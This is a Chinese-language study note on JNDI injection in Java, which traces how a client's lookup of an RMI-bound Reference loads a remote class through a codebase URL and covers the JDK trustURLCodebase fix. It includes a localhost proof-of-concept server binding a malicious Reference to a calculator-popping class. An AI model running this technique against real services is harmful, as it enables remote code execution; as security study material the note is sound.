参考博客：

[JNDI注入与动态类加载](https://halfblue.github.io/2021/11/18/JNDI%E6%B3%A8%E5%85%A5%E4%B8%8E%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/)

# JNDI

Java命名和接口目录为用Java编程语言编写的应用程序提供命名和目录功能。

可以通过一种通用方式访问各种服务，类似通过名字查找对象的功能，和RMI有点类似。

原生JNDI支持RMI，LDAP，COS，DNS.

# JNDI+RMI

JNDI结合RMI使用

RMIServer.java

```java
package org.example;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String[] args) throws Exception {
        RemoteObjImpl remoteObj = new RemoteObjImpl();
        Registry registry = LocateRegistry.createRegistry(1099);
        registry.bind("remoteObj",remoteObj);
    }
}
```

JNDIRMIServer.java

```java
public class JNDIRMIServer {
    public static void main(String[] args) throws Exception {
        InitialContext initialContext = new InitialContext();
        initialContext.rebind("rmi://localhost:1099/remoteObj", new RemoteObjImpl());
    }
}
```

JNDIRMIClient.java

```java
public class JNDIRMIClient {
    public static void main(String[] args) throws Exception {
        InitialContext initialContext = new InitialContext();
        IRemoteObj remoteObj = (IRemoteObj) initialContext.lookup("rmi://localhost:1099/remoteObj");
        remoteObj.sayHello("hello");
    }
}
```

自己可以运行下试试，不运行JNDIRMIServer.java的话，JNDI客户端一样可以获取到remoteObj服务端。

# JNDI Reference(传统JNDI注入)

JNDIRMIServer.java

**把引用Reference绑在RMI服务上**

Test.class是弹计算器的，放在本地目录。python开启个http服务。

```java
public class JNDIRMIServer {
    public static void main(String[] args) throws Exception {
        InitialContext initialContext = new InitialContext();

        //Reference
        Reference refObj = new Reference("Test", "Test", "http://localhost:4444/");
        initialContext.rebind("rmi://localhost:1099/remoteObj", refObj);

    }
}
```

攻击场景：我们可以控制恶意服务端绑定一个恶意Reference，让受害端lookup这个reference就能实现攻击。

下面跟进一下JNDIRMIClient中`IRemoteObj remoteObj = (IRemoteObj) initialContext.lookup("rmi://localhost:1099/remoteObj");`lookup方法的逻辑。

lookup最终调用到`registry.lookup("remoteObj");`

但是注意一下lookup函数返回的是一个ReferenceWrapper_Stub，而我们绑定时绑定的是Reference。

![image-20240727174142434](https://s2.loli.net/2024/07/27/h3rj9KdsT2BJvgP.png)

再看下绑定时的逻辑

最终调用到registry.rebind();方法，注意到有个encodeObject处理。

![image-20240727175743713](https://s2.loli.net/2024/07/27/WOE8wHY1mzdtupn.png)

**关于ReferenceWrapper_Stub，这个Stub的生成是在`new ReferenceWrapper((Reference)var1)  `里面生成的Stub（因为ReferenceWrapper继承了UnicastRemoteObject，和我们自己写的RMI接口实现类是一样的）。因为是结合的RMI，所以客户端是通过Stub和注册中心交流的（我是这么理解的）**

```java
private Remote encodeObject(Object var1, Name var2) throws NamingException, RemoteException {
    var1 = NamingManager.getStateToBind(var1, var2, this, this.environment);  
    if (var1 instanceof Remote) {
        return (Remote)var1;
    } else if (var1 instanceof Reference) {     //如果是Reference类型，则把它封装在ReferenceWrapper里面。
        return new ReferenceWrapper((Reference)var1);
    } else if (var1 instanceof Referenceable) {
        return new ReferenceWrapper(((Referenceable)var1).getReference());
    } else {
        throw new IllegalArgumentException("RegistryContext: object to bind must be Remote, Reference, or Referenceable");
    }
}
```

在继续看客户端lookup()

拿到ReferenceWrapper，进行decodeObject

**在getObjectInstance方法时还没有进行初始化（执行调用计算器方法），而在NamingManager.getObjectInstance方法就跳出RegistryContext这个类了。所以说最终实现类加载的地方并不是在RMI里面**

```java
//RegistryContext
private Object decodeObject(Remote var1, Name var2) throws NamingException {
    try {
        Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1;  //表达式为真，执行getReference拿到Reference
        return NamingManager.getObjectInstance(var3, var2, this, this.environment); //注意这个getObjectInstance方法
    } catch (NamingException var5) {
        throw var5;
    } catch (RemoteException var6) {
        throw (NamingException)wrapRemoteException(var6).fillInStackTrace();
    } catch (Exception var7) {
        NamingException var4 = new NamingException();
        var4.setRootCause(var7);
        throw var4;
    }
}
```

跟进NamingManager.getObjectInstance，需要关注的是`factory = getObjectFactoryFromReference(ref, f);`

```java
//NamingManager.getObjectInstance
if (ref != null) {
    String f = ref.getFactoryClassName();
    if (f != null) {
        // if reference identifies a factory, use exclusively

        factory = getObjectFactoryFromReference(ref, f);    //从引用中获取工厂factory
        if (factory != null) {
            return factory.getObjectInstance(ref, name, nameCtx,
                                             environment);
        }
        // No factory found, so return original refInfo.
        // Will reach this point if factory class is not in
        // class path and reference does not contain a URL for it
        return refInfo;

    } else {
        // if reference has no factory, check for addresses
        // containing URLs

        answer = processURLAddrs(ref, name, nameCtx, environment);
        if (answer != null) {
            return answer;
        }
    }
}
```

跟进getObjectFactoryFromReference

```java
static ObjectFactory getObjectFactoryFromReference(
    Reference ref, String factoryName)
    throws IllegalAccessException,
    InstantiationException,
    MalformedURLException {
    Class<?> clas = null;

    // Try to use current class loader
    try {
         clas = helper.loadClass(factoryName);    //尝试helper.loadClass加载类
    } catch (ClassNotFoundException e) {
        // ignore and continue
        // e.printStackTrace();
    }
    // All other exceptions are passed up.

    // Not in class path; try to use codebase
    String codebase;
    if (clas == null &&
            (codebase = ref.getFactoryClassLocation()) != null) {
        try {
            clas = helper.loadClass(factoryName, codebase);  //通过codeBase加载类
        } catch (ClassNotFoundException e) {
        }
    }

    return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
}
```

跟进第一个`clas = helper.loadClass(factoryName); `

可以发现类加载用的是AppClassLoader，是在客户端本地进行类的寻找的，肯定是找不到返回null的。

![image-20240727185208783](https://s2.loli.net/2024/07/27/mRT7L6pwAuSbI5e.png)

之后程序执行到第二个`clas = helper.loadClass(factoryName, codebase);`

**这里涉及到了一个codeBase，也就是我们输入的`http://localhost:4444/`，实际上是一种URL。**

**之前RMI的使用中，客户端和服务端同时定义了相同的远程接口，那么如果客户端没有那个服务接口怎么办？codeBase就是为了解决这个问题的，客户端可以通过codeBase从URL里面加载类，这样一来客户端不需要定义远程接口了。**

接下来看一下使用codeBase的类的加载

可以看到类加载器变为URLClassLoader，之前在双亲委派模型中也讲过URLClassLoader加载任意类。

![image-20240727190534065](https://s2.loli.net/2024/07/27/J9fjloICvg7kbqn.png)

之后执行URLClassLoader.loadClass，调用`Class<?> cls = Class.forName(className, true, cl);`，第二个参数设置为true，也就是会在加载类时初始化我们的恶意类。我的恶意类执行计算器代码写在了静态代码块里，所以在loadClass初始化恶意类时，就打开了计算器。

![image-20240727200940840](https://s2.loli.net/2024/07/27/FsEJNyn5kATGOt2.png)

可以看到URLClassLoader查找类的路径，就是我们输入的codeBase

![image-20240727201423198](https://s2.loli.net/2024/07/27/npfUL8h5QJwsuqF.png)

如果弹计算器代码写在了构造函数里面，就在执行`return (clas != null) ? (ObjectFactory) clas.newInstance() : null;`实例化Test类时，弹计算器。

## 总结攻击面

1. 之前观察到initialContext.lookup()方法时，最终会调用到registry.lookup()。bind和rebind也是一样的。所以远程RMI有的攻击点，这里也是有的
2. 就是本节讲的Reference的攻击点。

# RMI和CORBA的修复

在jdk6u141、7u131、8u121中，进行了修复。

## RMI修复

在RegistryContext.java中

```java
private Object decodeObject(Remote var1, Name var2) throws NamingException {
    try {
        Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1;
        Reference var8 = null;
        if (var3 instanceof Reference) {
            var8 = (Reference)var3;
        } else if (var3 instanceof Referenceable) {
            var8 = ((Referenceable)((Referenceable)var3)).getReference();
        }

        if (var8 != null && var8.getFactoryClassLocation() != null && !trustURLCodebase) {
            throw new ConfigurationException("The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.");
        } else {
            return NamingManager.getObjectInstance(var3, var2, this, this.environment);
        }
    } catch (NamingException var5) {
        throw var5;
    } catch (RemoteException var6) {
        throw (NamingException)wrapRemoteException(var6).fillInStackTrace();
    } catch (Exception var7) {
        NamingException var4 = new NamingException();
        var4.setRootCause(var7);
        throw var4;
    }
}
```

加入了trustURLCodebase参数，默认为false。如果不手动设为true。在本地查找不到类时，也不允许通过URLClassLoader加载codeBase路径的类的。

## CORBA修复

